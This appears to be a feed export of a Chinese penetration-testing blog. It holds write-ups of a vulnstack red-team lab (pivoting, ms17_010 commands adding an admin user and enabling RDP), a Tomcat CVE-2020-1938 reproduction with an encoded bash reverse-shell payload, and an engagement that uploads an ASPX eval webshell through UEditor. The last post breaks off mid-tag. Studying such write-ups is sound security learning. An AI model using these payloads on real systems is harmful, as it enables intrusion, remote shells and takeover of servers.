alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>整理一下信息</p><p>域：god.org</p><p>域内有三个用户：Administrator、ligang、liukaifeng01</p><p>域内三台主机：ROOT-TVI862UBEH(192.168.52.141)、STU1(win7)、OWA</p><p>域控：OWA(192.168.52.138)</p><p> win7内网ip：192.168.52.143</p><h2 id="四、横向移动"><a href="#四、横向移动" class="headerlink" title="四、横向移动"></a>四、横向移动</h2><h3 id="4-1添加路由、挂Socks4a代理"><a href="#4-1添加路由、挂Socks4a代理" class="headerlink" title="4.1添加路由、挂Socks4a代理"></a>4.1添加路由、挂Socks4a代理</h3><p>添加路由的目的是为了让MSF其他模块能访问内网的其他主机，即52网段的攻击流量都通过已渗透的这台目标主机的meterpreter会话来传递</p><p>添加socks4a代理的目的是为了让其他软件更方便的访问到内网的其他主机的服务</p><p>（添加路由一定要在挂代理之前，因为代理需要用到路由功能）</p><p> 添加内网路由</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/21.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>arp -a查看一下所有接口的当前 ARP 缓存表</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/22.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>设置代理，设置成功后打开其他程序需前加上proxychains</p><pre><code class="hljs sql">msf exploit(multi/<span class="hljs-keyword">handler</span>) &gt; <span class="hljs-keyword">use</span> auxiliary/<span class="hljs-keyword">server</span>/socks4amsf auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; <span class="hljs-keyword">show</span> options<span class="hljs-keyword">Module</span> options (auxiliary/<span class="hljs-keyword">server</span>/socks4a):   <span class="hljs-keyword">Name</span>     <span class="hljs-keyword">Current</span> Setting  <span class="hljs-keyword">Required</span>  Description   <span class="hljs-comment">----     ---------------  --------  -----------</span>   SRVHOST  <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>          yes       The address <span class="hljs-keyword">to</span> listen <span class="hljs-keyword">on</span>   SRVPORT  <span class="hljs-number">1080</span>             yes       The port <span class="hljs-keyword">to</span> listen on.Auxiliary <span class="hljs-keyword">action</span>:   <span class="hljs-keyword">Name</span>   Description   <span class="hljs-comment">----   -----------</span>   Proxy  msf auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; run[*] Auxiliary <span class="hljs-keyword">module</span> running <span class="hljs-keyword">as</span> background job <span class="hljs-number">0.</span>[*] <span class="hljs-keyword">Starting</span> the socks4a proxy <span class="hljs-keyword">server</span></code></pre><p>然后打开/etc/proxychains.conf（原始端口是9050，改为我们设置的1080）</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/23.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>测试一下可以成功访问192.168.52.0网段</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/24.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="4-2拿下第二台主机"><a href="#4-2拿下第二台主机" class="headerlink" title="4.2拿下第二台主机"></a>4.2拿下第二台主机</h3><p>扫描一下VM2（192.168.52.141）proxychains nmap -p 1-1000 -Pn -sT 192.168.52.141</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/25.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>开放了445端口，所以利用<code> use auxiliary/scanner/smb/smb_version</code> 可以扫描系统版本，扫描结果是<code>win2003</code></p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/26.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>使用<code>ms08-067</code>打一下，发现打不了</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/27.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>开始尝试<code>ms17-010</code>，使用<code>auxiliary/scanner/smb/smb_ms17_010</code>对52这个段进行扫描，发现三台主机都存在漏洞</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/28.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>利用<code>exploit/windows/smb/ms17_010_psexec</code>对<code>192.168.52.141</code>进行攻击，发现没办法弹回shell。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/29.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>发现可以使用<code>auxiliary/admin/smb/ms17_010_command</code>来执行一些命令且是系统权限。</p><pre><code class="hljs shell">use auxiliary/admin/smb/ms17_010_commandshow optionsset rhosts 192.168.52.141set command &quot;net user ice Aa123456 /add&quot; #添加用户exploit #成功执行</code></pre><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/30.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><pre><code class="hljs shell">set command &quot;net localgroup administrators ice /add&quot; #管理员权限exploit #成功执行</code></pre><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/31.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><pre><code class="hljs shell">set command &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;exploit #成功执行</code></pre><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/32.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>然后使用<code>proxychains</code>连接他的3389，<code>proxychains rdesktop 192.168.52.141</code></p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/33.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="4-3拿下域控"><a href="#4-3拿下域控" class="headerlink" title="4.3拿下域控"></a>4.3拿下域控</h3><p>pass</p>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note note-success&quot;&gt;
            &lt;p&gt;关于内网渗透的学习资源太少了，自己也在恶补这块的知识，文章是看前辈们的文章结合自己的实际操作写的，就当作是笔记吧&lt;/p&gt;
          &lt;/div&gt;

&lt;h2 id=&quot;一、环境搭建&quot;&gt;&lt;a href=&quot;#一、环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一、环境搭建&quot;&gt;&lt;/a&gt;一、环境搭建&lt;/h2&gt;&lt;h3 id=&quot;1-1环境搭建测试&quot;&gt;&lt;a href=&quot;#1-1环境搭建测试&quot; class=&quot;headerlink&quot; title=&quot;1.1环境搭建测试&quot;&gt;&lt;/a&gt;1.1环境搭建测试&lt;/h3&gt;&lt;p&gt;最近想要开始学习内网渗透，搜集了一些教程，准备先实验一个vulnstack靶机，熟悉一下内网渗透操作再学习基础知识。&lt;/p&gt;
&lt;p&gt;靶场下载地址：&lt;a href=&quot;http://vulnstack.qiyuanxuetang.net/vuln/detail/2/&quot;&gt;http://vulnstack.qiyuanxuetang.net/vuln/detail/2/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;压缩包中的win7为VM1，win2003为VM2，win2008为VM3，拓扑图如下所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/01.jpg&quot; alt=&quot;ATT&amp;amp;CK实战系列——红队实战（一）&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://www.secice.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="红队实战" scheme="http://www.secice.cn/tags/%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98/"/>
    
    <category term="内网渗透" scheme="http://www.secice.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）</title>
    <link href="http://www.secice.cn/p/933884b8"/>
    <id>http://www.secice.cn/p/933884b8</id>
    <published>2020-02-22T08:43:33.000Z</published>
    <updated>2020-11-23T09:04:26.617Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-漏洞影响"><a href="#0x01-漏洞影响" class="headerlink" title="0x01 漏洞影响"></a>0x01 漏洞影响</h3><ul><li>Apache Tomcat 9.x &lt; 9.0.31</li><li>Apache Tomcat 8.x &lt; 8.5.51</li><li>Apache Tomcat 7.x &lt; 7.0.100</li><li>Apache Tomcat 6.x</li></ul><h3 id="0x02-前提"><a href="#0x02-前提" class="headerlink" title="0x02 前提"></a>0x02 前提</h3><ul><li><p>目标机器开启AJP Connector 服务端口（默认开启，为8009端口）</p><a id="more"></a></li></ul><h3 id="0x03-文件读取-amp-文件包含RCE"><a href="#0x03-文件读取-amp-文件包含RCE" class="headerlink" title="0x03 文件读取&amp;文件包含RCE"></a>0x03 文件读取&amp;文件包含RCE</h3><ul><li>文件读取</li></ul><pre><code class="hljs shell">py -2 &quot;Tomcat-ROOT路径下文件读取(CVE-2020-1938).py&quot; -p 8009 -f /WEB-INF/web.xml 192.168.52.130</code></pre><p> <img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20200222_Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8A%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%89/01.jpg" alt="Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）"></p><ul><li>文件包含</li></ul><pre><code class="hljs shell">py -2 &quot;Tomcat-ROOT路径下文件包含(CVE-2020-1938).py&quot; -p 8009 -f /test.txt 192.168.52.130</code></pre><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20200222_Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8A%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%89/02.jpg" alt="Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）"></p><ul><li>test.txt</li></ul><pre><code class="hljs java">&lt;%        java.io.InputStream in = Runtime.getRuntime().exec(<span class="hljs-string">&quot;ping mdd7e.dnslog.cn&quot;</span>).getInputStream();        <span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;        <span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">2048</span>];        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);        <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;                out.println(<span class="hljs-keyword">new</span> String(b));        &#125;        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);%&gt;</code></pre><h3 id="0x04-反弹shell"><a href="#0x04-反弹shell" class="headerlink" title="0x04 反弹shell"></a>0x04 反弹shell</h3><ul><li>shell.txt</li></ul><pre><code class="hljs java">&lt;%        java.io.InputStream in = Runtime.getRuntime().exec(<span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjE0My84OTg5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>).getInputStream();        <span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;        <span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">2048</span>];        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);        <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;                out.println(<span class="hljs-keyword">new</span> String(b));        &#125;        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);%&gt;</code></pre><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20200222_Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8A%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%89/03.jpg" alt="Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）"></p><h3 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h3><p><a href="http://www.svenbeast.com/post/fqSI9laE8/">http://www.svenbeast.com/post/fqSI9laE8/</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01-漏洞影响&quot;&gt;&lt;a href=&quot;#0x01-漏洞影响&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞影响&quot;&gt;&lt;/a&gt;0x01 漏洞影响&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Apache Tomcat 9.x &amp;lt; 9.0.31&lt;/li&gt;
&lt;li&gt;Apache Tomcat 8.x &amp;lt; 8.5.51&lt;/li&gt;
&lt;li&gt;Apache Tomcat 7.x &amp;lt; 7.0.100&lt;/li&gt;
&lt;li&gt;Apache Tomcat 6.x&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;0x02-前提&quot;&gt;&lt;a href=&quot;#0x02-前提&quot; class=&quot;headerlink&quot; title=&quot;0x02 前提&quot;&gt;&lt;/a&gt;0x02 前提&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;目标机器开启AJP Connector 服务端口（默认开启，为8009端口）&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="http://www.secice.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="http://www.secice.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Tomcat" scheme="http://www.secice.cn/tags/Tomcat/"/>
    
  </entry>
  
  <entry>
    <title>佛学的魔改.net Ueditor</title>
    <link href="http://www.secice.cn/p/256d1eb"/>
    <id>http://www.secice.cn/p/256d1eb</id>
    <published>2019-12-11T01:19:25.000Z</published>
    <updated>2020-11-23T09:04:26.999Z</updated>
    
    <content type="html"><![CDATA[<p> 前几天在驻场时候遇到一个套娃的站，一个站里面套了N多个站，域名相同，根据不同的子目录进行区分，由于现在已经修复了，只能尽量还原当时的场景来写这文章。</p><p>网站上传点对上传的文件进行了二次渲染，此处无法绕过，只能寻找其他突破口（因为套了不少站，浪费大量时间）。</p><p>翻功能的时候，在一个站点找到这么一个编辑器，是不是很眼熟。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/01.jpg" alt="佛学的魔改Ueditor"></p><a id="more"></a><p>通过fd抓包获取到编辑器路径为：</p><p><code>https://xxx.xxx.com.cn/crm9000/HtmlControl/ueditor1.4.3.3/</code></p><p>果断用exp去打，结果访问漏洞地址的时候，发现404。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/02.jpg" alt="佛学的魔改Ueditor"></p><p>查看上传功能，发现上传功能也无法正常使用，提示后端配置项无法正常加载。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/03.jpg" alt="佛学的魔改Ueditor"></p><p>查看配置文件，感觉也没有问题呀，此时有点郁闷。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/04.jpg" alt="佛学的魔改Ueditor"></p><p>在牧马大佬的提示下，仔细查看js和流量。首先查看js，发现此处加载了一个Add.js文件。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/05.jpg" alt="佛学的魔改Ueditor"></p><p>打开这个js文件，找到了ueditor的真实路径。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/06.jpg" alt="佛学的魔改Ueditor"></p><p>但是去访问的时候，发现地址无法访问。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/07.jpg" alt="佛学的魔改Ueditor"></p><p>通过查看加载编辑器时的网络包，可以看到这也是后端配置项无法正常加载的原因。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/08.jpg" alt="佛学的魔改Ueditor"></p><p>然后尝试直接拼接编辑器路径到域名上，发现访问成功，原来是开发配置得有问题，多加了端口。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/09.jpg" alt="佛学的魔改Ueditor"></p><p>既然能够正常访问，那我就不客气了，拿exp干他，先在服务器上丢个aa.jpg的一句话马。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/10.jpg" alt="佛学的魔改Ueditor"></p><p>上传成功，返回的路径为：<code>upload/image/201912/11/6371165485276351045218627.aspx</code>（记住这个该死的路径，等下要懵逼。）</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/11.jpg" alt="佛学的魔改Ueditor"></p><p>接下来就是寻找路径了，我tm找了半个多小时呀，拼接了各种路径，都没找到。。。</p><p>后来实在无奈，继续去查看配置文件，看到配置文件的时候，人是懵逼的，路径是对的呀，但感觉总有哪里不对劲。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/12.jpg" alt="佛学的魔改Ueditor"></p><p>然后不信这个邪，又重新上传了一次，发现此时返回的路径是</p><p><code>upload/image/20191211/6371165520599596974371346.aspx</code></p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/13.jpg" alt="佛学的魔改Ueditor"></p><p>仔细一看，第一次返回的路径中多了’/‘，感情是服务端返回了一个假路径给我，难怪配置文件看着哪里不对劲，原来是路径规则。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/14.jpg" alt="佛学的魔改Ueditor"></p><p>但是访问shell的时候，报了一个错，第一次遇到这种问题。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/15.jpg" alt="佛学的魔改Ueditor"></p><p>直接在aa.jpg里面加上<code>&lt;head runat=&quot;server&quot; /&gt;</code>，再上传，浏览器访问的时候就正常了，但是菜刀连接的时候，又报了这一堆东西（同事复现的时候，菜刀直接连接成功，佛学）。</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/default/default.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/green/EnStyle.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/green/Style.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></code></pre><p>继续把这些加到aa.jpg内容里，最后，aa.jpg内容为：</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span> <span class="hljs-attr">runat</span>=<span class="hljs-string">&quot;server&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/default/default.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/green/EnStyle.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/green/Style.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;g&quot;],&quot;unsafe&quot;);%&gt;</code></pre><p>上传成功后，菜刀连接成功。</p><p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/16.jpg" alt="佛学的魔改Ueditor"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt; 前几天在驻场时候遇到一个套娃的站，一个站里面套了N多个站，域名相同，根据不同的子目录进行区分，由于现在已经修复了，只能尽量还原当时的场景来写这文章。&lt;/p&gt;
&lt;p&gt;网站上传点对上传的文件进行了二次渲染，此处无法绕过，只能寻找其他突破口（因为套了不少站，浪费大量时间）。&lt;/p&gt;
&lt;p&gt;翻功能的时候，在一个站点找到这么一个编辑器，是不是很眼熟。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/01.jpg&quot; alt=&quot;佛学的魔改Ueditor&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="原创文章" scheme="http://www.secice.cn/categories/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/"/>
    
    
    <category term="渗透实战" scheme="http://www.secice.cn/tags/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"/>
    
    <category term="原创文章" scheme="http://www.secice.cn/tags/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/"/>
    
  </entry>
  
  <entry>
    <title>记一次任意文件上传</title>
    <link href="http://www.secice.cn/p/edc6b9c0"/>
    <id>http://www.secice.cn/p/edc6b9c0</id>
    <published>2019-11-27T09:06:13.000Z</published>
    <updated>2020-11-23T09:04:26.954Z</updated>
    
    <content type="html"><![CDATA[<p>很久没发文章了，一个是因为忙，另一个就是不知道发什么，这次遇到一个上传觉得挺有意思的，就分享一下思路。<br>在客户现场驻场遇到的站点，我们乙方在挖洞的同时，甲方也有十多个人在同步挖洞。我们少挖到洞还要找我们麻烦，欲哭无泪，太难了。<br>当时通过另外一个漏洞getshell，还在暗自高兴的时候，翻目录的时候，看到一个TempFile的目录下有个名为shell.aspx的文件，文件上传时间在目标给我们的前几个小时（客户在给我们目标前，就让甲方的渗透人员先测试了），此时的我笑容逐渐消失，意识到问题的严重性。</p><a id="more"></a><p>看到TempFile的目录，猜测是通过上传功能上传上来的。然后在后台找了许久，还好功能不多，找到了上传的功能点（之前这个功能点因为浏览器不兼容的原因，无法使用，后来使用ie才能够正常使用）。</p><p>上传点在一个上传附件的地方，上传图片，拦截到此数据包发送到repeater模块。<br><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1.png" alt="20191127记一次任意文件上传"><br>修改数据包，可以发现上传成功，但是并不知道真实路径，文件的访问路径为：<a href="http://xxx.com:port/File/DownLoadFile/22c84d83-d9cf-dd7b-0dd1-ea72ddddd18b">http://xxx.com:port/File/DownLoadFile/22c84d83-d9cf-dd7b-0dd1-ea72ddddd18b</a>。<br><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2.png" 